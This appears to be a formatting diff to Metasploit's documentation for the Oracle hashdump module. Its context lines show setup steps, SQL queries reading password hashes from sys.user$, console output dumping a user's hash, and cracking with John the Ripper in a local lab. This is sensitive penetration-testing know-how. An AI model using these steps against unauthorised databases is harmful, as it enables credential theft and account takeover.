@@ -11,21 +11,21 @@
     ```
     C:> tnsping staticdb
     ...
-    
+
     Used TNSNAMES adapter to resolve the alias
     Attempting to contact (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = staticdb)))
     OK (0 msec)
     ```
 
     If `tnsping` fails, make sure the listener is setup correctly.
-    See [this Oracle doc](https://docs.oracle.com/cd/E11882_01/network.112/e41945/listenercfg.htm#NETAG294) for more information about its configuration. 
+    See [this Oracle doc](https://docs.oracle.com/cd/E11882_01/network.112/e41945/listenercfg.htm#NETAG294) for more information about its configuration.
 
   4. Make sure to create a user on the DB that has a known password, and sufficient privileges to select any table. This is necessary for getting the hashes.
   5. Test that the module's hash query works locally. Once your user is created with sufficient privileges, connect to the DB as the user, and proceed to run the following query
     * 12c: `SELECT name, spare4 FROM sys.user$ where password is not null and name <> \'ANONYMOUS\'`
     * pre-12c: `SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\'`
   6. Set up your MSF environment to support Oracle. You need gem ruby-oci8, as well as Oracle Instant Client.
-     [View the setup tutorial here](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux)
+     [View the setup tutorial here](https://docs.metasploit.com/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html)
   7. Make sure you have a database connected to MSF (postgresql). This can be done through `msfdb` tool or through `db_connect` command in `msfconsole`.
 
 ## Verification Steps
@@ -38,25 +38,25 @@
 
 ## Options
 
-  **DBPASS**
+### DBPASS
   The password to authenticate with. Change this from TIGER to the password of the privileged user created in step 4 of Preparation.
 
-  **DBUSER**
+### DBUSER
   The username to authenticate with. Change this from SCOTT to the user you created who is granted privileges to select from the sys.user$ table
 
-  **RPORT**
+### RPORT
   The TNS port of the Oracle DB server. By default, Oracle uses port 1521. Double-check the port of your Oracle DB.
 
-  **SID**
+### SID
   The Service ID (of the database) to authenticate with. Change this to your SID (if you changed the SID from default upon installation).
   Default is `ORCL` (default Oracle install value) or `XE` for free edition.
 
 ## Scenarios
 
-### Running Oracle 12c on a local Windows 10 machine, and MSF5 on Ubuntu for Windows (same machine)
+### Running Oracle 12c on a local Windows 10 machine, and msf on Ubuntu for Windows (same machine)
 
 ```
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > show options
+msf auxiliary(scanner/oracle/oracle_hashdump) > show options
 Module options (auxiliary/scanner/oracle/oracle_hashdump):
 
    Name     Current Setting  Required  Description
@@ -69,7 +69,7 @@ Module options (auxiliary/scanner/oracle/oracle_hashdump):
    SID      staticdb         yes       The sid to authenticate with.
    THREADS  1                yes       The number of concurrent threads
 
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > run
+msf auxiliary(scanner/oracle/oracle_hashdump) > run
 
 [*] Server is running 12c
 [*] Hash table :
@@ -81,16 +81,16 @@ msf5 auxiliary(scanner/oracle/oracle_hashdump) > run
  ...
  SCOTT                  S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699
  ...
- 
+
 [+] Hash Table has been saved
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > creds
+msf auxiliary(scanner/oracle/oracle_hashdump) > creds
 Credentials
 ===========
 
 host       origin     service            public  private                                                                                                                                                                                                                                                               realm  private_type        JtR Format
-----       ------     -------            ------  -------      
+----       ------     -------            ------  -------
 ...                                                                                                                                                                                                                                                         -----  ------------        ----------
 127.0.0.1  127.0.0.1  1522/tcp (oracle)  SCOTT   S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699         Nonreplayable hash  oracle12c
 ```
@@ -98,8 +98,8 @@ host       origin     service            public  private                        
 These hashes are then saved as credentials so that `jtr_oracle_fast` can crack them (using [John The Ripper "bleeding_jumbo"](https://github.com/magnumripper/JohnTheRipper)).
 
 ```
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > use auxiliary/analyze/jtr_oracle_fast
-msf5 auxiliary(analyze/jtr_oracle_fast) > run
+msf auxiliary(scanner/oracle/oracle_hashdump) > use auxiliary/analyze/jtr_oracle_fast
+msf auxiliary(analyze/jtr_oracle_fast) > run
 ...
 [*] Cracking oracle12c hashes in normal wordlist mode...
 Using default input encoding: UTF-8
@@ -139,9 +139,9 @@ resource (oracle.rb)> set dbpass oracle
 dbpass => oracle
 resource (oracle.rb)> set sid XE
 sid => XE
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > set verbose true
+msf auxiliary(scanner/oracle/oracle_hashdump) > set verbose true
 verbose => true
-msf5 auxiliary(scanner/oracle/oracle_hashdump) > run
+msf auxiliary(scanner/oracle/oracle_hashdump) > run
 
 [*] Server is running version 11g
 [*] Hash table :
